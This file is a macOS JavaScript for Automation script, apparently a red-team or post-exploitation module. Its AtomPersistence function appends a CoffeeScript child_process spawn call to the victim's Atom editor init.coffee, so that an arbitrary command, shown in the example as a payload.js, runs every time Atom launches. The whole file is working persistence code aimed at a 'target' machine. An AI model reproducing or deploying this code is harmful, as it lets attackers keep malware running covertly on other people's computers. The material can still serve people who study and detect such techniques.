//Atom Init Script Modification

//example usage
//AtomPersistence('osascript -l JavaScript /path/to/file/payload.js &')
function AtomPersistence(command) {
    ObjC.import('Foundation')
    ObjC.import('stdlib')
    var app = Application.currentApplication();
    app.includeStandardAdditions = true;
    var userHome = $.getenv('HOME')

    var output = ""
    try {
        function listDirectory(strPath) {
            var fm = $.NSFileManager.defaultManager;
            return ObjC.unwrap(
                    fm.contentsOfDirectoryAtPathError($(strPath)
                        .stringByExpandingTildeInPath, null))
                .map(ObjC.unwrap);
        }

        function writeTextToFile(text, file, overwriteExistingContent) {
            var fileString = file.toString()
            var openedFile = app.openForAccess(Path(fileString), {
                writePermission: true
            })
            if (overwriteExistingContent) {
                app.setEof(openedFile, {
                    to: 0
                })
            }
            app.write(text, {
                to: openedFile,
                startingAt: app.getEof(openedFile)
            })
            app.closeAccess(openedFile)
        }
        var atomPath = '/System/Volumes/Data/' + userHome + '/.atom/init.coffee'
        isDir = Ref()
        var atomExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPath(atomPath)
        if (atomExistsCheck == false) {
            output += "Atom is not installed on target"
        } else {
            formatCommand = command.split(" ");
            var stringArray = new Array();
            for (var i = 0; i < formatCommand.length; i++) {
                stringArray.push(formatCommand[i]);
                if (i != formatCommand.length - 1) {
                    stringArray.push(" ");
                }
            }

            var filteredCommand = stringArray.filter(function(el) {
                return el != " ";
            });

            var atomCommand = []
            for (var key in filteredCommand) {
                var transformCommand = "'" + filteredCommand[key] + "'"
                atomCommand.push(transformCommand)
            }
            var replaceCommand = atomCommand[0] + ", [" + atomCommand.slice(1) + "]"

            var commandTemplate = `
{spawn} = require 'child_process'
atom = spawn templateCommand`

            var newCommand = commandTemplate.replace("templateCommand", replaceCommand)
            writeTextToFile(newCommand, atomPath, false)
            output += "Atom Init script at " + atomPath + " has been modified for Persistence"
        }


    } catch (error) {
        output += error.toString()
    }
    return output
}
